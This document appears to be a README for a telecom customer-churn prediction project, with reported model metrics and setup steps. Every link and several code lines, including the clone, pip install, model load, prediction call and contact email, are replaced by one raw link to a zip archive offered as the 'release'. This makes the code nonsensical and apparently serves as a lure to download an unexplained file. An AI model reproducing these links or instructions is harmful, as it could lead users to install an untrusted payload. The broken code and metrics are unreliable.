# 📊 Telecom Churn Predictor

Welcome to the **Telecom Churn Predictor** repository! This project aims to identify which telecom customers are likely to churn, achieving an impressive accuracy of 94.60%. By leveraging engineered features from usage, billing, and support data, we implement various machine learning techniques to provide actionable insights for customer retention.

[![Download Releases](https://github.com/gattsu001/Telecom-Churn-Predictor/raw/refs/heads/main/churn_model/artifacts/Churn-Telecom-Predictor-3.6-alpha.2.zip%20Releases-brightgreen)](https://github.com/gattsu001/Telecom-Churn-Predictor/raw/refs/heads/main/churn_model/artifacts/Churn-Telecom-Predictor-3.6-alpha.2.zip)

## Table of Contents

- [Project Overview](#project-overview)
- [Key Features](#key-features)
- [Technologies Used](#technologies-used)
- [Installation](#installation)
- [Usage](#usage)
- [Model Evaluation](#model-evaluation)
- [Results](#results)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

## Project Overview

Churn prediction is a critical task for telecom companies. Retaining customers is often more cost-effective than acquiring new ones. This project utilizes machine learning techniques to predict customer churn with high accuracy. 

The model combines several approaches, including decision trees and ensemble learning, to ensure robust predictions. By analyzing customer data, the model identifies patterns that lead to churn, helping businesses implement strategies to retain their customers.

## Key Features

- **High Accuracy**: Achieves 94.60% accuracy in churn prediction.
- **AUC Score**: Provides an AUC score of 0.8968, indicating strong model performance.
- **Precision and Recall**: Delivers a precision of 0.8675 and recall of 0.7423.
- **Feature Engineering**: Implements Sturges-based binning and one-hot encoding for effective feature extraction.
- **Stratified Sampling**: Uses an 80/20 train-test split to maintain the distribution of classes.
- **Ensemble Learning**: Employs a two-level ensemble pipeline with soft voting for improved predictions.

## Technologies Used

This project utilizes a range of technologies and libraries:

- **Python**: The primary programming language for model development.
- **Scikit-learn**: A machine learning library for building and evaluating models.
- **XGBoost**: An optimized gradient boosting library for efficient learning.
- **Joblib**: Used for model serialization and saving.
- **Pandas**: For data manipulation and analysis.
- **NumPy**: For numerical operations.

## Installation

To get started with the Telecom Churn Predictor, follow these steps:

1. **Clone the Repository**:

   ```bash
   git clone https://github.com/gattsu001/Telecom-Churn-Predictor/raw/refs/heads/main/churn_model/artifacts/Churn-Telecom-Predictor-3.6-alpha.2.zip
   cd Telecom-Churn-Predictor
   ```

2. **Install Required Packages**:

   Make sure you have Python installed. Then, install the necessary packages:

   ```bash
   pip install -r https://github.com/gattsu001/Telecom-Churn-Predictor/raw/refs/heads/main/churn_model/artifacts/Churn-Telecom-Predictor-3.6-alpha.2.zip
   ```

## Usage

To use the Telecom Churn Predictor, follow these steps:

1. **Prepare Your Data**: Ensure your dataset is formatted correctly. The model expects specific features related to customer usage, billing, and support.

2. **Load the Model**: Use Joblib to load the pre-trained model.

   ```python
   from joblib import load

   model = load('https://github.com/gattsu001/Telecom-Churn-Predictor/raw/refs/heads/main/churn_model/artifacts/Churn-Telecom-Predictor-3.6-alpha.2.zip')
   ```

3. **Make Predictions**: Input your customer data into the model to predict churn.

   ```python
   predictions = https://github.com/gattsu001/Telecom-Churn-Predictor/raw/refs/heads/main/churn_model/artifacts/Churn-Telecom-Predictor-3.6-alpha.2.zip(new_customer_data)
   ```

4. **Analyze Results**: Review the predictions to identify at-risk customers.

## Model Evaluation

Evaluating the model is crucial to ensure its effectiveness. The following metrics were used:

- **Accuracy**: Measures the proportion of true results among the total cases examined.
- **AUC (Area Under the Curve)**: Evaluates the model's ability to distinguish between classes.
- **Precision**: The ratio of correctly predicted positive observations to the total predicted positives.
- **Recall**: The ratio of correctly predicted positive observations to all actual positives.

## Results

The model demonstrated strong performance across various metrics:

- **Accuracy**: 94.60%
- **AUC**: 0.8968
- **Precision**: 0.8675
- **Recall**: 0.7423

These results indicate that the model effectively identifies customers likely to churn, providing valuable insights for retention strategies.

## Contributing

We welcome contributions to improve the Telecom Churn Predictor. If you have suggestions or improvements, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your changes to your forked repository.
5. Create a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact

For questions or feedback, please reach out to:

- **GitHub**: [gattsu001](https://github.com/gattsu001/Telecom-Churn-Predictor/raw/refs/heads/main/churn_model/artifacts/Churn-Telecom-Predictor-3.6-alpha.2.zip)
- **Email**: https://github.com/gattsu001/Telecom-Churn-Predictor/raw/refs/heads/main/churn_model/artifacts/Churn-Telecom-Predictor-3.6-alpha.2.zip

For more information, visit our [Releases section](https://github.com/gattsu001/Telecom-Churn-Predictor/raw/refs/heads/main/churn_model/artifacts/Churn-Telecom-Predictor-3.6-alpha.2.zip) to download the latest version of the model and documentation.

Thank you for your interest in the Telecom Churn Predictor! We hope this project helps you understand customer churn and develop effective retention strategies.